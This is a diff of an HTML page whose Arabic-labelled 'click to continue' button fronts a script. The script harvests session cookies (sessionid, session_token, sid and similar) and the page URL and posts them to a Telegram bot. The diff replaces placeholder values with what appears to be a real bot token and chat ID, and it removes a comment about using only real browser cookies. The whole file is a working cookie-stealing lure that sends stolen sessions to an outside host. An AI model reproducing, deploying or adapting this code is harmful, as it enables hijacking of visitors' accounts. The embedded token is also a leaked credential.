@@ -10,8 +10,8 @@
     <button id="btn" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
 
 <script>
-    const botToken = "YOUR_BOT_TOKEN";
-    const chatId = "YOUR_CHAT_ID";
+    const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
+    const chatId = "408506450";
 
     const SESSION_COOKIE_NAMES = new Set([
         "sessionid", "session_token", "session_id", "session", "sid",
@@ -30,8 +30,8 @@
     ]);
 
     function getTargetCookies() {
-        const foundCookies = {};
         const cookies = document.cookie.split(";");
+        let foundText = "";
         
         for (let cookie of cookies) {
             const parts = cookie.split("=");
@@ -39,17 +39,20 @@
             const value = parts.slice(1).join("=").trim();
             
             if (SESSION_COOKIE_NAMES.has(name)) {
-                foundCookies[name] = value;
+                foundText += `${name} = ${value}\n`;
             }
         }
-        return foundCookies;
+        return foundText;
     }
 
     function sendData() {
-        // تم حذف الكوكي التجريبية هنا ليتم فحص الكوكيز الحقيقية الموجودة في المتصفح فقط
-        const extractedCookies = getTargetCookies();
+        const cookiesText = getTargetCookies();
         
-        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط: ${window.location.href}\n🍪 الكوكيز المستخرجة:\n${JSON.stringify(extractedCookies, null, 2)}`;
+        if (!cookiesText) {
+            return;
+        }
+
+        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط:\n${window.location.href}\n\n🍪 الكوكيز المستخرجة:\n${cookiesText}`;
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -63,7 +66,7 @@
                 text: message
             })
         })
-        .then(response => console.log("تم الإرسال إلى تليجرام بنجاح"))
+        .then(response => console.log("تم الإرسال بنجاح"))
         .catch(error => console.error("خطأ:", error));
     }
 
